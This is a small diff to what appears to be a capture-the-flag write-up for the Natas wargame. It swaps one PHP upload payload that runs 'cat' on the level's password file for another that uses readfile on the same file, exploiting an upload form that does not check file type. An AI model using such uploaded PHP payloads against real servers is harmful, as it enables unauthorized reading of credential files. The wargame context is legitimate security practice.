@@ -15,5 +15,5 @@ Since the webapp doesn't does and verification for the file type of the uploaded
 
 The script I used was
 ```PHP
-<? echo system("cat /etc/natas_webpass/natas13") ?>
+<? readfile("/etc/natas_webpass/natas13") ?>
 ```
